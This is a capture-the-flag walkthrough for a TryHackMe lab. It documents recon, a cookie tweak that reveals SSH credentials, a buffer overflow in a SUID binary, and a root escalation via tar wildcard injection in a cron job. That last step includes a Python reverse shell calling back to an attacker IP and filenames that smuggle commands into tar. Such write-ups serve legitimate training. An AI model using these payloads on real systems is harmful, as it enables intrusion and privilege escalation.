CTF URL: `https://tryhackme.com/r/room/anonymousplayground`
# IP
```
10.10.96.147
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.17.125 -v
# 22,80
```
## WEB
### Dirb
```bash
dirb http://10.10.17.125/
# result
```
### Nikto
```bash
nikto -h 10.10.17.125
# result
```
## Manual
`operatives.php`
```html
<li>themayor</li>
<li>spooky</li>
<li>darkstar</li>
<li>akaelite</li>
<li>ninja</li>
<li>w0rmer</li>
<li>nameless0ne</li>
<li>0day</li>
<li>szymex</li>
<li>ma1ware</li>
<li>paradox</li>
<li>bee</li>
<li>iamwill</li>
<li>jammy</li>
<li>magna</li>
<li>cryillic</li>
<li>skidy</li>
<li>naughty</li>
<li>thealchemist</li>
<li>itsundae</li>
```
```html

<!-- <li class="nav-item">
	<a class="nav-link text-white" href="/upcoming.php">Upcoming Missings</a>
</li> -->
```

`http://10.10.17.125/robots.txt`
```
User-agent: *
Disallow: /zYdHuAKjP
```

Accessing gives:
```bash
You have not been <b>granted</b> access. <br /> Access denied. 
```

If we change `access` cookie to `granted`, then
`hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN`

> ![[Turana's cipher solution.png]]

`magna::magnaisanelephant`
and this gives SSH access
```bash
magna@anonymous-playground:~$ cat flag.txt 
9184177ecaa83073cbbf36f1414cc029
```

# Priv Esc to another user
`magna` directory
```bash
magna@anonymous-playground:~$ ll
-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt
-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld*
-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
```
`note_from_spooky.txt`
```bash
magna@anonymous-playground:~$ cat note_from_spooky.txt
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```
# Buffer Overflow
```bash
magna@anonymous-playground:~$ ./hacktheworld 
Who do you want to hack? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
Interesting Function
```bash
objdump -d -Mintel hacktheworld
0000000000400657 <call_bash>:
```
Lets examine binary in `gdb`
```bash
gdb hacktheworld

(gdb) run
Starting program: /home/magna/hacktheworld 
Who do you want to hack? Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5   

Program received signal SIGSEGV, Segmentation fault.
0x0000356341346341 in ?? ()
# offset 72
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456
gives
Program received signal SIGSEGV, Segmentation fault.
0x0000363534333231 in ?? ()
```
So instead of 123456 put location of `0000000000400657 <call_bash>:` and we choose the next address ...58
```bash
echo -n aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > input
echo -n 580640000000 | xxd -r -p >> input 

magna@anonymous-playground:~$ xxd input 
00000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000040: 6161 6161 6161 6161 5806 4000 0000       aaaaaaaaX.@...
magna@anonymous-playground:~$ (cat input; cat) | ./hacktheworld 

Who do you want to hack? 
We are Anonymous.

We are Legion.
We do not forgive.

We do not forget.
[Message corrupted]...Well...done.
whoami
spooky

cd ../
cd spooky
cat flag.txt
69ee352fb139c9d0699f6f399b63d9d7
```
# Tar
in `spooky` directory
```bash
magna@anonymous-playground:/home/spooky$ ll
-rwxrwxrwx 1 spooky magna     0 Jul 10  2020 .confrc*
-r-------- 1 spooky spooky   33 Jul  4  2020 flag.txt
-rw-rw-r-- 1 spooky magna   535 Jul 10  2020 .webscript
```
`.webscript`
```bash
magna@anonymous-playground:/home/spooky$ cat .webscript
#!/bin/sh

# get current user uid / gid
CURR_UID="$(id -u)"
CURR_GID="$(id -g)"

# save file
cat > .cachefile.c << EOF
#include <stdio.h>
int main()
{
setuid($CURR_UID);
setgid($CURR_GID);
execl("/bin/bash", "-bash", NULL);
return 0;
}
EOF

# make folder where the payload will be saved
mkdir .cache
chmod 755 .cache

# compile & give SUID
gcc -w .cachefile.c -o .cache/.cachefile
chmod 4755 .cache/.cachefile

# clean up
rm -rf ./'--checkpoint=1'
rm -rf ./'--checkpoint-action=exec=sh .webscript'
rm -rf .webscript
rm -rf .cachefile.c
```

**Cron**
```
*/1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```


```bash
cd /home/spooky
echo $'/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.35.156\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\'' > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.35.156] from (UNKNOWN) [10.10.247.223] 35874
# whoami
whoami
root
# cd
cd
cat flag.txt
bc55a426e98deb673beabda50f24ce66
# 
```

